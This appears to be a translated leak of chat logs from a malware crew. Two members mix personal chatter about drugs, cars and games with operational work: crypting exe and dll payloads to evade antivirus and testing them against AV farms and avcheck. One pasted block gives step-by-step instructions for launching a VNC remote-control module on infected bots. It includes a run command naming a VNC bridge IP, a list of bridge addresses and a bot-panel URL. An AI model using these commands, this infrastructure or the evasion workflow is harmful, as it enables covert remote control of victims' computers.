[28.07.21 08:07:25] manuel: yeah.
[28.07.21 08:07:55] manuel: the next days you should save all files and all test reports for each file
for manual tests, you just write down by hand in the file - I checked so-and-so on so-and-so machine - the result
We have absolutely all the clients are up.
I still do not see the picture, where the problem is, with them or with us
at the end of the day the testers are sending us reports on the manuel's tricycle
[28.07.21 08:08:00] manuel: This is from the management
[28.07.21 08:08:10] wild: I read it already.
[28.07.21 08:08:34] wild: and kolyan wrote it too
[28.07.21 08:08:35] wild: 7:54 AM
hello!
prepare yesterday's g15 build, 100 crypts in the exe
the crypto in the exe also check on the AB farms
in the cryptopanel in front of the file VM - select VM, select the test type "AV Only"
if the report is not generated - make one more try, two in total
if both reports are not generated - write to me or the responsible persons (martin, demetrius)
there is a section in the rules about checks on farms and a list of machines to run
7:57 AM
accepted, I will look at it now.
7:57 AM
the idea is to run it on all root avs, for all exe files now
next, daily report to me about the issued crypts and results of check, by 18mc for the current day
if you check something and give it out after 18mc - include it to the report the next day
7:58 AM
received
7:58 AM
report the following way: if full check via panel - then archive with crypt and all reports, if you check something manually then link to dincheck and file with description of what you check (OS version, AB) and check results
[28.07.21 08:09:11] manuel: more on the ehe, give me a link to hugo crypto as it appears
[28.07.21 08:09:22] wild: don't get it
[28.07.21 08:09:43] manuel: some crypts you need to get hugo to do
[28.07.21 08:09:51] manuel: just give him the source
[28.07.21 08:09:56] manuel: and ask him to do the crypt
[28.07.21 08:10:01] wild: and ask him for 10 crypts?)
[28.07.21 08:10:13] manuel: Yeah, in addition to 100

[29.07.21 12:20:02] wild: but I think KC is cooler
[29.07.21 12:20:10] wild: although it requires skill
[29.07.21 12:20:46] wild: I like KC, I bend over everyone, I KILL PEOPLE
[29.07.21 12:21:16] manuel: Yes, but it's monotonous.) In Battle it's more variability.
[29.07.21 12:21:18] wild: but the battle is a buffoon)))))
[29.07.21 12:21:24] manuel: All kinds of classes + tech
[29.07.21 12:21:57] wild: in cc you're flexible and you can go toe-to-toe with 1xp to fuck up the whole team) i play purely with guys full pack
[29.07.21 12:22:07] wild: there are roles too
[29.07.21 12:22:17] wild: depending on where you spun and where you went and what you took
[29.07.21 12:22:18] manuel: yeah yeah yeah

[29.07.21 12:23:30] manuel: Enjoy
[29.07.21 12:24:07] wild: cca what else is cool in my opinion - very low entrance threshold to play at the level of 80% of players
[29.07.21 12:24:28] wild: but it takes years of training to get them higher
[29.07.21 12:24:34] wild: thousands of hours
[29.07.21 12:24:44] manuel: Right

 do you keep virtual disks of virtualis on the csd?
does it affect speed than they will on HDD?
8:04 AM
of course it does.
checked back last year, the difference is obvious
8:04 AM
i'll keep in mind... i had a hitch but only with the memory on them - i increased the amount of RAM, disabled swap files - two in parallel started to work fine
but they are on HDD
8:04 AM
and on the xd, if several games are run on one, it causes lags, despite the fact that the computer is powerful
And on the cd 3 work safely

Usually past versions are enough to estimate cleanliness of stubs, it's mostly load size and a bit of its entropy that counts

[06.08.21 10:26:57] wild: kolyan said what's up
[06.08.21 10:26:57] wild: ok, it's to look at the state of different stubs under different loads

[06.08.21 10:29:13] wild: I'm fed up with the city fucking pressure
[06.08.21 10:30:33] manuel: What about working with ginger?
[06.08.21 10:31:31] manuel: As my bass Mikhalych from Primium Engineering was saying, with whom I was building towers for MTS: They fuck us, and we get stronger!
[06.08.21 10:31:38] manuel: That's what the city's talking about.)
[06.08.21 10:31:54] manuel: But it's only if there's a hard target and you want to achieve it

[06.08.21 10:33:19] manuel: Yeah, hard but strong
[06.08.21 10:33:20] wild: stress on stress
[06.08.21 10:33:45] wild: I never smoked so long in my life
[06.08.21 10:34:04] wild: and the main effect from weed is a state of not giving a fuck about everything
[06.08.21 10:34:09] wild: fuck all and nothing bothers me
[06.08.21 10:34:11] manuel: Only when I was a kid)
[06.08.21 10:34:15] wild: but now everything gives a fuck and everything bothers
[06.08.21 10:34:36] wild: and i smoked a little bit 3 weeks ago and got so fucked up
[06.08.21 10:34:41] wild: it makes me sick
[06.08.21 10:34:50] manuel: that's good
[06.08.21 10:34:51] wild: i'm at that point in my life
[06.08.21 10:34:53] manuel: development

[06.08.21 10:35:51] wild: yeah, sure
[06.08.21 10:36:02] manuel: Well, start saving 1k
[06.08.21 10:36:24] wild: but honestly i already told you what life is like for me, and unfortunately it's not like that when i work 18 to 7 with no days off
[06.08.21 10:36:42] manuel: Yeah. It's a question of performance.
[06.08.21 10:36:48] wild: I want to sit quietly in a recording studio crib in peter with bushes in my room and do what I'm doing now
[06.08.21 10:36:52] wild: no business, etc.
[06.08.21 10:37:03] wild: making music
[06.08.21 10:37:05] wild: grow weed

[06.08.21 10:37:47] wild: the dumbest thing is I can't call myself out of where I am
[06.08.21 10:37:58] wild: neither financially nor humanly
[06.08.21 10:38:01] manuel: Why?
[06.08.21 10:38:14] wild: I'll leave the boys to their fate, we rented a house for 3

[06.08.21 10:38:46] wild: they had a 45k house
[06.08.21 10:38:48] manuel: Then set yourself a goal. Like by New Year's Eve to do everything with them and go to the life you see for yourself.
[06.08.21 10:39:15] wild: awful life bro, I hope before the new year I'll change my mind and make it right
[06.08.21 10:39:25] wild: but you're right of course
[06.08.21 10:39:32] wild: although my goals don't usually work as goals
[06.08.21 10:39:47] manuel: we are driven by goals and the pursuit of them
[06.08.21 10:39:53] manuel: it gives power
[06.08.21 10:39:58] manuel: This is the Way
[06.08.21 10:40:26] wild: I have a feeling you'll be texting me very soon, go to the toad, there's a tar waiting to talk to you
[06.08.21 10:40:35] wild: that gives me strength)
[06.08.21 10:40:43] wild: I'll snap out of it and do it right)
[06.08.21 10:40:44] manuel: Yeah, I hope so too.)

[06.08.21 10:41:01] manuel: Just silence in this direction.
[06.08.21 10:41:01] wild: I get a little shaky from that
[06.08.21 10:41:06] wild: it's day 3
[06.08.21 10:41:20] manuel: I guess. I thought he might be back in the fall.
[06.08.21 10:41:24] wild: I smell something fishy.
[06.08.21 10:41:56] wild: i smell like nobody else can fuck me up like him
[06.08.21 10:41:56] wild: haha
[06.08.21 10:42:57] manuel: That's right! He's tough!)

[06.08.21 10:43:29] wild: we're all fucked up in some places
[06.08.21 10:43:43] wild: he was just changing his mind
[06.08.21 10:43:48] wild: not sure exactly how
[06.08.21 10:43:55] wild: but from time to time it was obvious
[06.08.21 10:44:29] manuel: lsd

[06.08.21 10:44:48] wild: that sounds about right
[06.08.21 10:44:57] wild: because sometimes he was just bitching
[06.08.21 10:45:03] wild: but it's from the mushrooms
[06.08.21 10:45:19] wild: hysterical unrestrained hilarity
[06.08.21 10:45:32] manuel: Yeah, I remember him like that
[06.08.21 10:46:00] wild: with outbursts of fierce shenanigans
[06.08.21 10:46:04] wild: it's just about mushrooms
[06.08.21 10:46:41] wild: by the way yes I've eaten mushrooms in nature, but I guess I've told you, and mushrooms always give the same pulse, always give you happiness and purify your consciousness
[06.08.21 10:46:50] wild: that was recently
[06.08.21 10:46:57] wild: when I was out there

[20.08.21 08:48:18] wild: I don't know, the car market's fucked
[20.08.21 08:48:22] wild: especially the Mercedes
[20.08.21 08:48:39] wild: the Mercedes doubled in those years
[20.08.21 08:48:44] wild: and most of all exactly w211
[20.08.21 08:48:47] wild: :D
[20.08.21 08:48:55] wild: you could always get it for 400
[20.08.21 08:49:02] wild: you can't get it for 600 now
[20.08.21 08:49:28] manuel: the money's devalued.
[20.08.21 08:49:33] manuel: liquid cars apparently
[20.08.21 08:49:42] manuel: they buy and sell them all the time
[20.08.21 08:49:47] wild: the most unbreakable of the Mercedes
[20.08.21 08:49:51] manuel: It's cool that our salaries are in bucks
[20.08.21 08:50:07] wild: even parts manufacturers sued them at one time
[20.08.21 08:50:10] wild: because they don't break down
[20.08.21 08:50:10] manuel: The more the ruble depreciates against the dollar, the more money we have)

[20.08.21 08:50:42] wild: 2.4 ?
[20.08.21 08:50:48] manuel: he liked to get fucked up to 180
[20.08.21 08:50:51] manuel: yeah
[20.08.21 08:50:51] wild: 3.2 is a different story))))
[20.08.21 08:50:57] manuel: worked better then)
[20.08.21 08:51:07] manuel: yeah 3.2 is a real gun
[20.08.21 08:51:24] wild: but this time I don't want a format, I want pure rear wheel drive
[20.08.21 08:51:33] manuel: So it eats less?
[20.08.21 08:51:35] wild: because it costs a fuckload of suspension
[20.08.21 08:51:42] wild: don't give a fuck what he eats
[20.08.21 08:51:46] wild: fuckin' service
[20.08.21 08:51:48] manuel: What about maintenance, is it expensive per month?
[20.08.21 08:51:51] wild: too much
[20.08.21 08:51:59] manuel: over 100?
[20.08.21 08:52:06] wild: 15 K a month, that's service
[20.08.21 08:52:18] wild: suspension????? only work costs 80k
[20.08.21 08:52:27] wild: parts 150
[20.08.21 08:52:32] wild: that's for the format
[20.08.21 08:52:41] wild: rear one's twice as cheap
[20.08.21 08:52:50] wild: all together just over 100
[20.08.21 08:53:50] wild: in my country the roads are fucked up, you can ride for years. and here in the european part of russia there are such potholes that suspension falls off in a couple of seasons for sure
[20.08.21:54:06] wild: Especially since traffic's always fast and there's no choice, you can't get around the fucking potholes
[20.08.21 08:54:39] wild: i fuckin' with moscow in that respect, fuckin' rigego's car is free, the whole suspension with replacement came to 16k :D
[20.08.21 08:54:55] wild: But it's a fuckin' car, and I'm not fuckin' around in it.
[20.08.21 08:55:56] wild: a mercedes is always fucking asking for something minor to be perfect. it could go years without maintenance, but everything would rattle, rattle and fart
[20.08.21 08:56:22] wild: in short, a car that needs attention and at least once in 2 - 3 months service
[20.08.21 08:56:52] wild: if you bring it to perfection - 2 years it will drive without problems, but it will cost more than it costs
[20.08.21 08:57:06] wild: such specimens cost over a million on the market
[20.08.21 08:57:49] manuel: Strange. I thought the roads were better in Moscow and St. Petersburg.
[20.08.21 08:58:06] wild: No way.
[20.08.21 08:58:10] wild: they may be good somewhere
[20.08.21 08:58:19] wild: on the shawl for instance
[20.08.21 08:58:53] wild: well, if you go the whole length of the handkerchief in peter, it's only 450 rubles
[20.08.21 08:59:01] wild: here in Moscow I don't even know how much it is
[20.08.21 08:59:14] manuel: Fucking hell.
[20.08.21 08:59:33] wild: And there's no fucking place to park, that's what pisses me off the most after peter
[20.08.21 08:59:47] wild: you can always park for free everywhere in peter
[20.08.21 08:59:51] wild: The main thing is to find a spot
[20.08.21 08:59:58] wild: here - fuck, everything is paid and there's no room
[20.08.21 09:00:26] manuel: Moscow is fuckin' wild!)

[23.08.21 12:06:56] wild: and with an honest approach
[23.08.21 12:06:59] wild: not a bummer
[23.08.21 12:07:10] manuel: Yes! And it's very valuable!
[23.08.21 12:07:22] wild: 2 - 2.5 thousand and I fuck like hell

[23.08.21 12:14:24] wild: yeah, and of course I like it
[23.08.21 12:14:32] wild: I like sitting at my computer, you can't take that away from me

[31.08.21 09:04:13] wild: you must feel it with your soul
[31.08.21 09:04:18] wild: it's more than that
[31.08.21 09:04:28] wild: in peter your soul is calm and satisfied

[31.08.21 16:33:46] wild: Uh-huh.
[31.08.21 16:34:54] wild: ``
 it's a vnc module customized for BC

 works with crypto profiles bk and rundll
there are compatibility issues with our stubs - only 2 out of 7 currently fit
this is promised to fix
dll-module run in bot with Run.dll command. Choose timeout "Background run" - if you don't need to limit the duration of session (if you need - use the appropriate time from the list)
In the Parameters field we write:
DllRegisterServer --id %id% --group %group% --ip 149.3.170.236
only the last value of ip-address of the vnc-bridge will be changed here
The bot is found in the list http://195.123.212.155:9091/api/online/list
by its id, which is assigned to it in the admin area
via UltraVNC the connection is lifted, you can see the desktop

I gave out today, you try to crypt and test - you may have to do this more often
vnc bridge gaskets relevant now 3 pieces:

149.3.170.236
89.41.182.96
45.42.202.178

If they stop working - write me, in the future I will determine the order from whom to take them
i tried crypto day 6 and 9 stubs worked, the rest do not yet
3:43 PM
I'll look into it now.
3:43 PM
via UltraVNC connection is up
- you don't have to check it, if you run it once and the bot's id appears in the list - it means that the session is up
but if you restart a lot and so on - there may be old sessions hanging there, in this case, to be reliable, you can try to connect via mtz viewer
vnc*
DllRegisterServer --id %id% --group %group% --ip 149.3.170.236
- another moment %group% now works only with Royal assemblies
in other BCs - you need to specify group explicitly (it only affects password which will be generated for vnc-connection)
soon others will be finished and all will have the same command

make a crypt, run BC today's 19 or 20 group, in the BC bot put the command to run the dll
with specified parameters and vnc-module crypt
then go to http://195.123.212.155:9091/api/online/list and look for your bot's ID

```
[31.08.21 16:35:04] wild: I also tested this module today

 AV notices by activity that something is wrong. Highlights an indication, then checks that indication before launching.
It's all automated. Sometimes the av company guys manually create the signature.
10:30 AM
that's how I imagined it but without clever words 😃
10:30 AM
If the crypter is very well done, then the feature allocated for one crypt will be absent in the other one altogether (ideal case)
10:31 AM
now i'm getting a little smarter, thanks
10:32 AM
I'm only having trouble with eset right now. The guys there are apparently smart, a lot. They taught the AV to execute code on their emulator, when checking the file. And they catch the execution pattern... What a mess...
10:32 AM
yeah, if such powerful coders were everywhere they would have to go into battle with a bayonet knife

[10.09.21 08:59:08] manuel: I remember that too.
[10.09.21 08:59:12] wild: I had to bring the money because I'm responsible and the guys don't know
[10.09.21 08:59:22] wild: but i mean, i was able to build a team very quickly

[20.09.21 11:12:00] wild: I'm gonna move to VM tomorrow
[20.09.21 12:06:44] manuel: Bro, here's another question.
[20.09.21 12:06:45] manuel: do we often see vatakats on crypts?
[20.09.21 12:07:00] wild: vatakats :D
[20.09.21 12:07:02] wild: how?
[20.09.21 12:07:12] wild: vatacation is evil, but no respect from AKA
[20.09.21 12:07:18] wild: is it when Windows fights?
[20.09.21 12:07:27] wild: or what)
[20.09.21 12:07:41] manuel: Yeah))) Not what you think.)
[20.09.21 12:08:00] wild: you mean like when you let it go and fuck off?
[20.09.21 12:08:12] wild: not found in dll stubs
[20.09.21 12:08:15] wild: in exe
[20.09.21 12:08:31] wild: all of them always write in the crypto, I can't say exactly which stubs did it that way
[20.09.21 12:08:39] manuel: Yeah
[20.09.21 12:08:41] wild: but there was one last week, 5 or 7
[20.09.21 12:08:45] manuel: Do you remember which echoes were in?
[20.09.21 12:08:47] wild: now 5 works fine
[20.09.21 12:08:48] manuel: Stubb
[20.09.21 12:08:51] wild: mabey 7
[20.09.21 12:08:59] wild: but it's not exact
[20.09.21 12:09:57] manuel: okay.
[20.09.21 12:10:11] wild: probably 7 if my memory serves me right, that's possible
[20.09.21 12:10:19] wild: i think it was clean, but vinla was swearing
[20.09.21 12:10:31] wild: again, clean on the day
[20.09.21 12:10:31] manuel: Yeah
[20.09.21 12:10:43] wild: as far as I can tell it's not clean
[20.09.21 12:11:01] wild: because when I'm making a mont of crypts by checking them with acek there's always fucking vindef
[20.09.21 12:11:12] wild: fuckin' kill it!
[20.09.21 12:11:25] wild: once I was doing 8 crypts for 5 hours

[20.09.21 14:09:57] wild: yeah
[20.09.21 14:10:03] wild: i used to update even before there was no kolyan
[20.09.21 14:10:45] manuel: there's just a load on the stubs to check for detects

[20.09.21 14:11:20] wild: yeah yeah bro sure)
[20.09.21 14:11:32] wild: I already know only 6 stub works in dll

[20.09.21 14:12:44] manuel: Awcheck just happens to have a different hash
[20.09.21 14:13:02] wild: I don't know what the fuck is a different hash and what is not)
[20.09.21 14:13:03] wild: okay)))
[20.09.21 14:13:05] manuel: Not quite right
[20.09.21 14:13:06] manuel: It's better to give out
[20.09.21 14:13:24] manuel: Each file is unique and hash is a unique indicator
[20.09.21 14:13:36] manuel: Is it a requirement to verify by avcheck?
[20.09.21 14:13:38] wild: mmm
[20.09.21 14:13:48] wild: that's what kolyan told me to do with this customer

I don't know for sure if they will work. We wanted to work today and no one is answering.
it was like that with derek before, they also planned morning shift, they poked around for a couple of days and gave up
9:08 AM
Roger, just got off the phone with the landlord at 7 o'clock +- 10 minutes the back door to the BC opens, that means I can come by that time!

i.e. 50 minutes to prepare crypts minimum, enough time?

 Hi. I have a question.
There was a situation on Friday. Sap zeus zakala BK in the evening. After hours collin. We gathered with the coder took the addresses and gave out the crypts from the wild.
How to be in this situation? Colin says to give out only during working hours. Because when he's not there there can be confusion with pad addresses, packets and stuff.
9:21 AM
hi
explain to him that such orders are made on our goodwill, depending on whether the right people have already left or stayed and ready to do
and it is better not to do so, because on weekends there are no regular unloads
and if you need to unload at an after-hours time, you need to prepare for it in advance and give orders in advance
9:23 AM
Got it.
```

1:33 PM
Hi
1:33 PM.
there is a unique opportunity to make 25 crypts?
dll
1:33 PM
No unique
1:33 PM
with reimplementation of the function
well normal?))
1:33 PM
Well everyone does the usual ones.
No one's got a unique one.
If they tie it to 1, they'll all go down.
Unique is when you wrote a kryptor, krypted once and then threw it away
1:35 PM
Yeah, I understand, I just wanted to lighten up this gray workday with humor
1:35 PM
))
Well, throw it in.
1:35 PM
unique opportunity is a turn of phrase)
thank you)
1:35 PM
Aah
There you go.

hello!
Hammer's fighting back, saying he's innocent.
and his cars aren't his, they're rented like everyone else's.
and he doesn't have any leaks.
but franze says there might be.
You should get in touch with him.
I talked to the Frenchman, he asked me who I was working with. I told him you.
he asked me how?
I said magic.
But that's not what this is about.
Work gets attention and importance.
Hoff is gone. It's his thing. It needs to evolve. Now we need a common effort.
You have to offer something (or better yet, contact the hammer and either join in or lead the effort).
but without the hassle.
we just need to coordinate and in the same conditions to clarify the detects on the bot
1:26 PM
what's the crypto channel called?
10:27 AM
got it, i'll text hammer now and ask him about the detects and what he has on the car there
10:27 AM
hammer asks
10:28 AM
crypters
10:28 AM
there you go
tell him
10:32 AM
Listen, you should ask the admins of the farm he has the cars on
maybe they know the difference
